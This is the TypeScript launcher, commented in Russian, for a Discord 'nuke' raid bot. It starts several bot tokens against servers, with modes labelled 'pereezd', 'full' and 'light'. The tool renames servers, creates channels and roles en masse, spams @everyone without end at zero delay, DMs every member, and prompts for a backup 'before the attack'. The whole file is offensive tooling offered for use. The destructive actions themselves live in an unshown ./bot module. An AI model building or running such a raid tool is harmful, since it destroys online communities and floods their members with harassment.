import 'dotenv/config';
import { NukeBot, NukeMode } from './bot';
import { clear, banner, colors, input } from './utils';
import { backupAllGuilds } from './backup';

// === НАСТРОЙКИ ПО УМОЛЧАНИЮ ===
const DEFAULT_TOKEN = '';
const DEFAULT_MODE: NukeMode = 'pereezd';
const DEFAULT_CHANNEL_NAME = 'crashby-wistom ';
const DEFAULT_ROLE_NAME = 'crashby-wistom ';
const DEFAULT_MESSAGE = '@everyone # Приветик вам от Wiston.';
const DEFAULT_CONCURRENCY = 50;
const DEFAULT_LEAVE = false;
const DEFAULT_INFINITE_SPAM = true;   // бесконечный спам по умолчанию
const DEFAULT_SPAM_DELAY_MS = 0;      // без задержки (максимальная скорость)
const DEFAULT_DM_MEMBERS = true;      // отправка ЛС по умолчанию
const DEFAULT_DM_DELAY_MS = 0;        // без задержки (максимальная скорость)
const DEFAULT_SERVER_NAME = 'crashby-wistom '; // новое название сервера
const DEFAULT_SERVER_ICON = '';       // URL иконки (пусто = не менять)
// ===============================

async function main() {
  clear();
  console.log(banner);
  console.log(`${colors.y}Запуск с предустановленными параметрами...${colors.w}\n`);

  const useDefaults = (await input(`${colors.y}Использовать встроенные настройки? (Y/n): ${colors.g}`)).toLowerCase() !== 'n';
  
  let tokens: string[];
  let channelName: string;
  let roleName: string;
  let messageText: string;
  let mode: NukeMode;
  let concurrency: number;
  let leaveImmediately: boolean;
  let infiniteSpam: boolean;
  let spamDelayMs: number;
  let createBackup: boolean;
  let dmMembers: boolean;
  let dmDelayMs: number;
  let changeServerName: string | undefined;
  let changeServerIcon: string | undefined;

  if (useDefaults) {
    tokens = [DEFAULT_TOKEN];
    channelName = DEFAULT_CHANNEL_NAME;
    roleName = DEFAULT_ROLE_NAME;
    messageText = DEFAULT_MESSAGE;
    mode = DEFAULT_MODE;
    concurrency = DEFAULT_CONCURRENCY;
    leaveImmediately = DEFAULT_LEAVE;
    infiniteSpam = DEFAULT_INFINITE_SPAM;
    spamDelayMs = DEFAULT_SPAM_DELAY_MS;
    createBackup = false;
    dmMembers = DEFAULT_DM_MEMBERS;
    dmDelayMs = DEFAULT_DM_DELAY_MS;
    changeServerName = DEFAULT_SERVER_NAME || undefined;
    changeServerIcon = DEFAULT_SERVER_ICON || undefined;
    
    console.log(`${colors.g}✓ Используются встроенные настройки${colors.w}`);
    console.log(`  Токен: ${tokens[0].slice(0, 20)}...`);
    console.log(`  Режим: ${mode}`);
    console.log(`  Каналы: ${channelName}`);
    console.log(`  Роли: ${roleName}`);
    console.log(`  Текст: ${messageText.slice(0, 50)}...`);
    console.log(`  Бесконечный спам: ${infiniteSpam ? 'Да' : 'Нет'}`);
    console.log(`  Рассылка в ЛС: ${dmMembers ? 'Да' : 'Нет'}`);
    if (changeServerName) console.log(`  Новое название сервера: ${changeServerName}`);
  } else {
    const tokenCount = parseInt(await input(`${colors.y}Сколько ботов? (1): ${colors.g}`)) || 1;
    tokens = [];
    for (let i = 0; i < tokenCount; i++) {
      const token = await input(`${colors.y}Токен бота ${i + 1}:${colors.g}`);
      tokens.push(token.trim() || DEFAULT_TOKEN);
    }

    channelName = await input(`${colors.y}Название каналов (по умолч. ${DEFAULT_CHANNEL_NAME}):${colors.g}`);
    if (!channelName) channelName = DEFAULT_CHANNEL_NAME;

    roleName = await input(`${colors.y}Название ролей (по умолч. ${DEFAULT_ROLE_NAME}):${colors.g}`);
    if (!roleName) roleName = DEFAULT_ROLE_NAME;

    messageText = await input(`${colors.y}Текст сообщения (Enter = дефолт):${colors.g}`);
    if (!messageText) messageText = DEFAULT_MESSAGE;

    const modeInput = await input(`${colors.y}Режим (pereezd/full/light/none) [pereezd]:${colors.g}`);
    mode = (modeInput.toLowerCase() as NukeMode) || DEFAULT_MODE;
    if (!['pereezd', 'full', 'light', 'none'].includes(mode)) mode = DEFAULT_MODE;

    const concurrencyInput = await input(`${colors.y}Конкурентность (1-200) [${DEFAULT_CONCURRENCY}]:${colors.g}`);
    concurrency = parseInt(concurrencyInput) || DEFAULT_CONCURRENCY;
    concurrency = Math.min(200, Math.max(1, concurrency));

    const leaveInput = await input(`${colors.y}Покинуть сервера сразу? (y/N):${colors.g}`);
    leaveImmediately = leaveInput.toLowerCase() === 'y';

    const spamInput = await input(`${colors.y}Бесконечно спамить сообщения в созданные каналы? (Y/n):${colors.g}`);
    infiniteSpam = spamInput.toLowerCase() !== 'n';

    if (infiniteSpam) {
      const delayInput = await input(`${colors.y}Задержка между сообщениями в мс (0 = без задержки):${colors.g}`);
      spamDelayMs = parseInt(delayInput) || 0;
    } else {
      spamDelayMs = 0;
    }

    const backupInput = await input(`${colors.y}Создать бэкап серверов перед атакой? (y/N):${colors.g}`);
    createBackup = backupInput.toLowerCase() === 'y';

    const dmInput = await input(`${colors.y}Отправить сообщение всем в ЛС? (Y/n):${colors.g}`);
    dmMembers = dmInput.toLowerCase() !== 'n';

    if (dmMembers) {
      const dmDelayInput = await input(`${colors.y}Задержка между ЛС в мс (0 = без задержки):${colors.g}`);
      dmDelayMs = parseInt(dmDelayInput) || DEFAULT_DM_DELAY_MS;
    } else {
      dmDelayMs = DEFAULT_DM_DELAY_MS;
    }

    const changeNameInput = await input(`${colors.y}Изменить название сервера? (Enter = не менять):${colors.g}`);
    changeServerName = changeNameInput.trim() || undefined;

    const changeIconInput = await input(`${colors.y}URL иконки сервера? (Enter = не менять):${colors.g}`);
    changeServerIcon = changeIconInput.trim() || undefined;
  }

  // Подтверждение запуска
  console.log(`\n${colors.y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${colors.w}`);
  console.log(`${colors.c}Настройки готовы!${colors.w}`);
  console.log(`${colors.y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${colors.w}\n`);
  
  const confirmStart = await input(`${colors.r}Запускаем? (Y/n): ${colors.g}`);
  if (confirmStart.toLowerCase() === 'n') {
    console.log(`${colors.y}Отменено пользователем.${colors.w}`);
    process.exit(0);
  }

  console.log(`\n${colors.g}Запуск ${tokens.length} ботов...${colors.w}\n`);

  const bots = tokens.map((token, idx) => {
    return new NukeBot(token, {
      channelName,
      roleName,
      messageText,
      mode,
      leaveImmediately,
      concurrency,
      infiniteSpam,
      spamDelayMs,
      createBackup,
      dmMembers,
      dmDelayMs,
      changeServerName,
      changeServerIcon
    });
  });

  const startPromises = bots.map((bot, i) => bot.start(i * 0.5));
  await Promise.all(startPromises);

  console.log(`${colors.g}Все боты запущены. Ctrl+C для остановки.${colors.w}`);

  process.on('SIGINT', async () => {
    console.log(`\n${colors.r}Завершение...${colors.w}`);
    await Promise.all(bots.map(b => b.stop()));
    process.exit(0);
  });
}

main().catch(console.error);